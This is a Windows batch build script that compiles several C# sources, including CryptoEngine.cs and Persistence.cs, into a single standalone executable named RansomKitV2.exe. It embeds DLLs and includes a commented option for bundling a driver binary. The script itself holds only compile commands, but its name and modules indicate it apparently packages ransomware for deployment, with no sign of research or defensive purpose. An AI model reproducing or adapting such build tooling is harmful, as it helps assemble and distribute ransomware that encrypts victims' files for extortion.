@echo off
setlocal
cd /d "%~dp0"

echo ============================================
echo   Building RansomKitV2 (Single EXE)
echo ============================================
echo.

REM ── 1. Clean prior artifacts ─────────────────
if exist "RansomKitV2.exe" del /f /q "RansomKitV2.exe"

REM ── 2. Locate the C# Compiler (csc.exe) ──────
set "CSC="
if not defined CSC if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe" set "CSC=C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe"
if not defined CSC if exist "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe" set "CSC=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe"

if not defined CSC set "CSC=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC%" (
    echo [!] ERROR: csc.exe not found.
    pause
    exit /b 1
)
echo [*] Compiler: %CSC%

REM ── 3. Embed Resources (DLLs) ─────────────────
set "RES="
REM Add your DLLs here. The name AFTER the comma is the internal resource name.
if exist "cimgui.dll" set "RES=%RES% /resource:cimgui.dll,cimgui.dll"
if exist "AotBst.dll" set "RES=%RES% /resource:AotBst.dll,AotBst.dll"

REM If you have a driver .bin file (like your repo), embed it like this:
REM if exist "Template.bin" set "RES=%RES% /resource:Template.bin,Template.bin"

echo [*] Resources to embed: %RES%
echo.

REM ── 4. Compile the C# Source Files ────────────
echo [*] Compiling C# sources...
"%CSC%" /nologo /target:winexe /platform:x64 /optimize+ ^
    /out:RansomKitV2.exe ^
    /reference:System.dll ^
    /reference:System.Core.dll ^
    /reference:System.Drawing.dll ^
    /reference:System.Windows.Forms.dll ^
    /reference:Microsoft.Win32.Registry.dll ^
    %RES% ^
    Program.cs MainForm.cs CryptoEngine.cs Persistence.cs

if errorlevel 1 (
    echo.
    echo [!] COMPILATION FAILED.
    pause
    exit /b 1
)

echo.
echo ============================================
echo [+] BUILD COMPLETE: RansomKitV2.exe
echo ============================================
echo The EXE is now fully standalone.
pause
endlocal